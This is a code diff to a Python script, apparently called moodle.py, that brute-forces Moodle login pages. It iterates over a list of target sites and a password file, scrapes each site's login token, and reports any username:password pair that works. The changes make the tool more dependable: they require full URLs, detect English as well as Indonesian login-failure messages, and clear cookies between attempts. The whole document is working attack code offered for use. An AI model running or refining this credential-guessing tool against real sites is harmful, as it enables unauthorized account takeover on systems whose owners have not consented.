@@ -12,7 +12,7 @@ def banner():
     """)
 
 def get_token(target):
-    r = sess.get("http://" + target + "/login/index.php")
+    r = sess.get(target + "/login/index.php")
     s = bs4(r.text, "html.parser").find("input", attrs={'name': 'logintoken'})
     return s.get("value")
 
@@ -22,15 +22,17 @@ def login_moodle(target, user, passwd,token):
         'username': user,
         'password': passwd,
     }
-    r = sess.post("http://" + target + "/login/index.php", data = data)
-    if re.search("loginerrormessage", r.text) or re.search("Anda belum login.", r.text):
+    r = sess.post(target + "/login/index.php", data = data)
+    if re.search("loginerrormessage", r.text) or re.search("Anda belum login.", r.text) or re.search("Invalid login, please try again",r.text):
+        sess.cookies.clear()
         return False
     else:
+        sess.cookies.clear()
         return True
 
 banner()
 if len(sys.argv) < 2:
-    print("Usage : python moodle.py target.txt\nNote : target list without http://")
+    print("Usage : python moodle.py target.txt\nNote : target list WITH http://")
 else:
     pwx = open("pass.txt", "r")
     lists = pwx.read().split("\n") #load pass list
@@ -39,12 +41,13 @@ else:
     for i in x:
         print("[*] Checking " + i + "...")
         for pw in lists:
+            token = get_token(i)
+            login = login_moodle(i, user, pw, token)
             try:
-            	if login_moodle(i, user, pw, get_token(i)):
-                	print("[+] Found => " + user + ":" + pw)
-                	exit()
-            	else:
-                	print("[x] " + user + ":" + pw)
+                if login:
+                    print("[+] "+ str(login) + " => " + user + ":" + pw)
+                    exit()
+                else:
+                    print("[x] "+ str(login) + " => " + user + ":" + pw)
             except:
                 pass
-
